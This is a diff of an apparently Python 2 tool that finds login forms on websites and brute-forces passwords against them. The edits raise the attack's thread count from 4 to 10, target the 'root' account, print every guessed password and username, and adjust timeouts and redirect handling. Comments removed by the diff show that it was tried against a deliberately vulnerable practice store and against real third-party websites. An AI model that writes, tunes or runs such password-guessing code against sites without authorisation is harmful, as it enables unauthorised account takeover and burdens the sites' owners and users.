@@ -8,7 +8,7 @@ from bs4 import BeautifulSoup
 from postInfo import postInfo
 from ssl import wrap_socket
 
-standard_users= ['root', 'admin', 'user']
+standard_users= ['root']
 attempts = []
 success = False
 login_cred = ""
@@ -33,7 +33,7 @@ class Requester:
         parsed_domain = urlparse(domain)
         self.host = parsed_domain.netloc
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.sock.settimeout(1)
+        self.sock.settimeout(2)
         self.scheme = parsed_domain.scheme
         # Handle if connection not made
         if self.scheme.lower() == "https":
@@ -128,7 +128,7 @@ class Requester:
         body = ""
         for key in fields.keys():
             body += "&"
-            body += str(key) + "=" + str(fields[key])
+            body += str(key) + "=" + fields[key].encode('UTF-8')
         body = body[1:]
         header = ("POST {} HTTP/1.1\r\n"
                 "Host: {}\r\n"
@@ -176,6 +176,7 @@ class Requester:
                 return None
             query = form_inputs.copy()
             query[password_field] = passwords[i]
+            print query[password_field]
             attempts.append(passwords[i])
             r = Requester(self.initial_host)
             response = r.post(info, query)
@@ -207,6 +208,7 @@ class Requester:
             user_list = user_list + standard_users
 
         for user in user_list:
+            print "Attempting to bruteforce user: " + user
             self.bruteForce(url, user, keywords, action, login_field, password_field, login_form)
             if login_cred:
                 break
@@ -229,9 +231,9 @@ class Requester:
         #Only works for one username
         login_form[login_field] = username
         threads = []
-        for i in range(4):
-            low = (len(keywords)/4)*i
-            high = (len(keywords)/4)*(i+1)
+        for i in range(10):
+            low = (len(keywords)/10)*i
+            high = (len(keywords)/10)*(i+1)
             threads.append(Thread(target=self.ATTACK, args=(low, high, info, login_form, keywords, password_field)))
             threads[i].start()
         for t in threads:
@@ -252,7 +254,7 @@ class Requester:
                     self.sock.close()
                     self.scheme = "https"
                     self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    self.sock.settimeout(1)
+                    self.sock.settimeout(2)
                     self.sock = wrap_socket(self.sock)
                     self.sock.connect((self.host, 443))
                 new_response = self.get(new_host, cookies)
@@ -265,6 +267,10 @@ class Requester:
                     #relax back to initial domain
                 elif urlparse(self.initial_host).netloc == urlparse(new_host).netloc:
                     self.host = urlparse(new_host).netloc
+                else:
+                    new_host = self.scheme + '://' + self.host + '/' + new_host
+                new_response = self.get(new_host, cookies)
+                return new_response.response_body
             else:
                 if new_host.startswith("http://"):
                     new_host = new_host[7:]
@@ -277,20 +283,9 @@ class Requester:
                     new_response = self.get(new_host, cookies)
                 else:
                     return False
-            return new_response.response_body
+                if new_response == -1:
+                    return False
+                return new_response.response_body
         return False
 
-
-#path = 'http://austinchildrensacademy.org'
-#r =  Requester('http://www.badstore.net')
-#info = r.get('http://shop.nhl.com')
-#r.post(info, {"Hello":"World", "foo":"bar"})
-#path = 'http://austinchildrensacademy.org/about-aca/'
-#
-#
-
-#
-#
-#info = postInfo('/cgi-bin/badstore.cgi?action=loginregister','','')
-#
 
